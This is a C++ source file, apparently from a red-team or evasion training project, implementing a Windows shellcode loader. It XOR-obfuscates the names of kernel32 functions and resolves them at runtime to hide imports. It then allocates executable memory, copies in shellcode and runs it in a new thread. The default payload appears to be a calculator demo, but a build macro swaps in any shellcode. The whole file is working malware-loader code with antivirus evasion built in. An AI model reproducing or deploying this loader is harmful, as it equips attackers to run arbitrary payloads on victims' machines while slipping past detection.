#include <windows.h>
#include <cstdio>


void my_xor(unsigned char data[], int size, const unsigned char key[], int key_size)
{
	for (int i = 0; i < size; i++)
	{
		data[i] = data[i] ^ key[i % key_size];
	}
}

int main()
{

	// The multiple #include that declare variables are done here, because when done before the main function, the symbols' names can be found in the binary
#include "functions.hpp"

#ifdef SHELLCODE_PATH
#include SHELLCODE_PATH
#else
#include "../../src/shellcodes/unobfuscated_calc.hpp"
#endif

	// Step 1 : Get the addresses of the functions we want to call

	// Let's first deobfuscate all the names
	my_xor(KERNEL32_dll_obfuscated_function_name, sizeof(KERNEL32_dll_obfuscated_function_name), KERNEL32_dll_key, sizeof(KERNEL32_dll_key));
	my_xor(CreateThread_obfuscated_function_name, sizeof(CreateThread_obfuscated_function_name), CreateThread_key, sizeof(CreateThread_key));
	my_xor(VirtualAlloc_obfuscated_function_name, sizeof(VirtualAlloc_obfuscated_function_name), VirtualAlloc_key, sizeof(VirtualAlloc_key));
	my_xor(WaitForSingleObject_obfuscated_function_name, sizeof(WaitForSingleObject_obfuscated_function_name), WaitForSingleObject_key, sizeof(WaitForSingleObject_key));

#if DEBUG
	printf("deobfuscated function names : %s (at %p), %s (at %p), %s (at %p), %s (at %p)\n",
		   CreateThread_obfuscated_function_name,
		   CreateThread_obfuscated_function_name,
		   VirtualAlloc_obfuscated_function_name,
		   VirtualAlloc_obfuscated_function_name,
		   WaitForSingleObject_obfuscated_function_name,
		   WaitForSingleObject_obfuscated_function_name,
		   KERNEL32_dll_obfuscated_function_name,
		   KERNEL32_dll_obfuscated_function_name);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// get the handle to the kernel32.dll module
	HMODULE kernel32_dll = GetModuleHandleA((char*)KERNEL32_dll_obfuscated_function_name);

#if DEBUG
	printf("kernel32.dll handle : %p\n", kernel32_dll);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Get the addresses of the functions we want to call
	FARPROC CreateThread_address = GetProcAddress(kernel32_dll, (char*)CreateThread_obfuscated_function_name);
	FARPROC VirtualAlloc_address = GetProcAddress(kernel32_dll, (char*)VirtualAlloc_obfuscated_function_name);
	FARPROC WaitForSingleObject_address = GetProcAddress(kernel32_dll, (char*)WaitForSingleObject_obfuscated_function_name);

#if DEBUG
	printf("CreateThread address : %p\n", CreateThread_address);
	printf("VirtualAlloc address : %p\n", VirtualAlloc_address);
	printf("WaitForSingleObject address : %p\n", WaitForSingleObject_address);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Finally, let's get pointers to the functions we want to call
	typedef HANDLE (WINAPI* pCreateThread)(
		LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		SIZE_T                  dwStackSize,
		LPTHREAD_START_ROUTINE  lpStartAddress,
		__drv_aliasesMem LPVOID lpParameter,
		DWORD                   dwCreationFlags,
		LPDWORD                 lpThreadId
	);

	typedef LPVOID (WINAPI* pVirtualAlloc)(
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  flAllocationType,
		DWORD  flProtect
	);

	typedef DWORD (WINAPI* pWaitForSingleObject)(
		HANDLE hHandle,
		DWORD  dwMilliseconds
	);

	auto CreateThread = (pCreateThread)CreateThread_address;
	auto VirtualAlloc = (pVirtualAlloc)VirtualAlloc_address;
	auto WaitForSingleObject = (pWaitForSingleObject)WaitForSingleObject_address;

#if DEBUG
	printf("Shellcode is located at %p\n", shellcode);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 2 : Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(shellcode),
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

#if DEBUG
	printf("Allocated memory at %p\n", memory);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 3 : Copy the shellcode to the allocated memory
	memcpy(memory,
		   shellcode,
		   sizeof(shellcode));

#if DEBUG
	printf("Shellcode copied to memory\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 4 : Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
